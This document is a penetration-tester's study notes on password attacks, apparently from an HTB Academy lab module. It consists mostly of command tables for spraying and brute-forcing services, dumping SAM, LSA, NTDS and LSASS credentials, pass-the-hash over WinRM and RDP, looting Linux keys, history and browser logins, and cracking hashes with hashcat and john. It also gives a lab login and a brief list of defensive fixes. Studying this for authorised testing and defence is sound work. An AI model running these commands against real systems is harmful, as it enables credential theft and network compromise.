# Password Attacks

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Obtain, dump, and crack credentials: build wordlists, attack services remotely, loot hashes from Windows/Linux hosts, and crack them offline.

## Default / reused credentials
First thing to try — one overlooked router/printer/firewall with factory creds opens the network:
```bash
creds search mssql            # DefaultCreds-Cheat-Sheet tool (default creds DB by product)
```
Also check CIRT.net and the DefaultCreds-Cheat-Sheet repo. Always test reuse of any found password across other hosts/services.

## Wordlist generation
```bash
cewl https://<site> -d 4 -m 6 --lowercase -w site.wordlist     # scrape words from a site
hashcat --force base.list -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.list   # rule mutations
username-anarchy -i firstlast.txt                               # username formats
```

## Remote password attacks
```bash
crackmapexec winrm <ip> -u users.txt -p pass.txt                # spray WinRM
crackmapexec smb <ip> -u user -p pass --shares                  # test + enum shares
hydra -L users.txt -P pass.txt <service>://<ip>
# dump hashes with valid creds:
crackmapexec smb <ip> --local-auth -u <u> -p <p> --sam          # local SAM
crackmapexec smb <ip> --local-auth -u <u> -p <p> --lsa          # LSA secrets
crackmapexec smb <ip> -u <u> -p <p> --ntds                      # domain NTDS (DA)
evil-winrm -i <ip> -u Administrator -H "<NThash>"               # Pass-the-Hash (WinRM)
# PtH over RDP — first enable Restricted Admin mode on the target, then /pth:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:<ip> /u:<user> /pth:<NThash>
```

## Windows local credential looting
```text
findstr /SIM /C:"password" *.txt *.ini *.config *.xml *.ps1 *.yml
# LSASS dump (living-off-the-land) → extract offline:
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp
# SAM/SYSTEM:
reg save HKLM\SAM sam.save ; reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL
# NTDS.dit via shadow copy (on a DC):
vssadmin create shadow /for=C:  →  copy ...\Windows\NTDS\NTDS.dit  →  secretsdump.py -ntds ...
```

## Linux local credential looting
```bash
find / -name "*.cnf" -o -name "*.conf" 2>/dev/null | xargs grep -iE "user|pass" 2>/dev/null
grep -rnw "PRIVATE KEY" / 2>/dev/null       # SSH private keys
find / -name "*.db" -o -name "*.sql" 2>/dev/null
tail -n5 /home/*/.bash*                      # history
grep -rnw "ssh-rsa" /home/* 2>/dev/null      # authorized_keys / pubkeys
cat /etc/crontab ; ls -la /etc/cron.*/       # creds in scheduled jobs
# automated cred dumpers:
./mimipenguin.sh                             # scrape creds from memory (needs root)
python3 lazagne.py all                       # pull stored creds from many apps (browsers, etc.)
# Firefox stored logins:
cat ~/.mozilla/firefox/*.default-release/logins.json | jq .
python3 firefox_decrypt.py                   # decrypt them
```

## Cracking (hashcat / john)
```bash
# common modes:
hashcat -m 1000 ntlm.txt rockyou.txt          # NTLM
hashcat -m 1800 -a 0 unshadowed.txt rockyou.txt   # Linux sha512crypt
hashcat -m 500 md5crypt.txt rockyou.txt       # md5crypt  |  -m 22100 BitLocker
hashcat -m 13100 ...  # Kerberoast TGS  |  -m 18200 AS-REP  |  -m 5600 NetNTLMv2  |  -m 13400 KeePass
# append --show to print already-cracked results from the potfile
# Linux shadow:
unshadow /etc/passwd /etc/shadow > unshadowed.txt
# *2john extractors (then john/hashcat the output):
ssh2john id_rsa > h ; office2john doc.docx > h ; zip2john f.zip > h ; pdf2john.pl f.pdf > h ; bitlocker2john -i disk.vhd > h
john --wordlist=rockyou.txt h
```

## Fix / takeaways
Strong unique passwords + MFA, no password reuse, protect LSASS (Credential Guard), limit who can read SAM/NTDS, strong hashing (no NTLM/RC4). 

> The flow: loot hashes (dump or find them) → identify the type (hashid / hash-identifier) → pick the right hashcat `-m` mode → crack with rockyou + rules. Getting the mode right is half the battle. Credential reuse across hosts is what turns one cracked hash into the whole network.

## Full command reference (source notes)
Complete command set — nothing trimmed.

**Connecting to a target**
| Command | Description |
|---|---|
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | Connect via RDP |
| `evil-winrm -i <ip> -u user -p password` | PowerShell session over WinRM |
| `ssh user@<ip>` | SSH to a target |
| `smbclient -U user \\\\<ip>\\SHARENAME` | Connect to an SMB share |
| `python3 smbserver.py -smb2support CompData /home/<user>/Documents/` | Host an SMB share on the attack host |

**Password reuse / default passwords**
| Command | Description |
|---|---|
| `/home/kali/.local/bin/creds search mssql` | Search the DefaultCreds-Cheat-Sheet DB |

**Password mutations**
| Command | Description |
|---|---|
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Build a wordlist from a site |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list` | Rule-based wordlist mutation |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt` | Generate candidate usernames |
| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Build a file-extension list for cred hunting |

**Remote password attacks**
| Command | Description |
|---|---|
| `crackmapexec winrm <ip> -u user.list -p password.list` | Brute WinRM |
| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Enumerate SMB shares with creds |
| `hydra -L user.list -P password.list <service>://<ip>` | Brute with user+pass lists |
| `hydra -l username -P password.list <service>://<ip>` | Static user, pass list |
| `hydra -L user.list -p password <service>://<ip>` | User list, static pass |
| `hydra -C <user_pass.list> ssh://<IP>` | Credential stuffing (combined list) |
| `crackmapexec smb <ip> --local-auth -u <u> -p <p> --sam` | Dump SAM over the network |
| `crackmapexec smb <ip> --local-auth -u <u> -p <p> --lsa` | Dump LSA secrets (possible cleartext) |
| `crackmapexec smb <ip> -u <u> -p <p> --ntds` | Dump NTDS hashes over the network |
| `evil-winrm -i <ip> -u Administrator -H "<hash>"` | Pass-the-Hash login (WinRM) |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable Restricted Admin mode (for PtH RDP) |
| `xfreerdp /v:<ip> /u:julio /pth:<hash>` | Pass-the-Hash via RDP |

**Windows local credential hunting**
| Command | Description |
|---|---|
| `tasklist /svc` | List running processes |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` | Search files for "password" |
| `Get-Process lsass` | Find the LSASS PID |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full` | Create an LSASS memory dump |
| `pypykatz lsa minidump /path/to/lsassdump` | Extract creds from an LSASS dump |
| `reg.exe save hklm\sam C:\sam.save` | Save a registry hive (sam/security/system) |
| `move sam.save \\<ip>\NameofFileShare` | Move a file to a share |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Dump hashes from saved hives |
| `vssadmin CREATE SHADOW /For=C:` | Volume shadow copy (safe NTDS.dit copy) |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Copy NTDS.dit from a shadow copy |

**Linux local credential hunting**
| Command | Description |
|---|---|
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Find config files |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done` | Find creds in config files |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done` | Find database files |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"` | Find text files |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do ... find / -name *$l ...;done` | Find script files |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do ... find / -name *$ext ...;done` | Find documents |
| `cat /etc/crontab` · `ls -la /etc/cron.*/` | Look for creds in cron |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"` | Find SSH private keys |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"` | Find keys in home dirs |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"` | Find public keys |
| `tail -n5 /home/*/.bash*` | Check bash history |
| `python3 mimipenguin.py` · `bash mimipenguin.sh` | Scrape creds from memory |
| `python2.7 lazagne.py all` · `python3 lazagne.py browsers` | Pull stored creds (all / browser modules) |
| `ls -l .mozilla/firefox/ \| grep default` | Find Firefox profile |
| `cat .mozilla/firefox/*.default-release/logins.json \| jq .` | Firefox stored logins |
| `python3.9 firefox_decrypt.py` | Decrypt Firefox-stored creds |

**Cracking passwords**
| Command | Description |
|---|---|
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Crack NTLM hashes |
| `hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt --show` | Crack/show a single NTLM hash |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Combine passwd+shadow |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Crack sha512crypt |
| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt` | Crack md5crypt |
| `hashcat -m 22100 backup.hash rockyou.txt -o backup.cracked` | Crack BitLocker |
| `ssh2john.pl SSH.private > ssh.hash` → `john ssh.hash --show` | Crack an SSH key passphrase |
| `office2john.py Protected.docx > protected-docx.hash` → `john --wordlist=rockyou.txt protected-docx.hash` | Crack an Office doc |
| `pdf2john.pl PDF.pdf > pdf.hash` → `john --wordlist=rockyou.txt pdf.hash` | Crack a PDF |
| `zip2john ZIP.zip > zip.hash` → `john --wordlist=rockyou.txt zip.hash` | Crack a ZIP |
| `bitlocker2john -i Backup.vhd > backup.hashes` | Extract BitLocker hashes from a VHD |
| `file GZIP.gzip` | Identify a file's format |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Brute an encrypted archive |
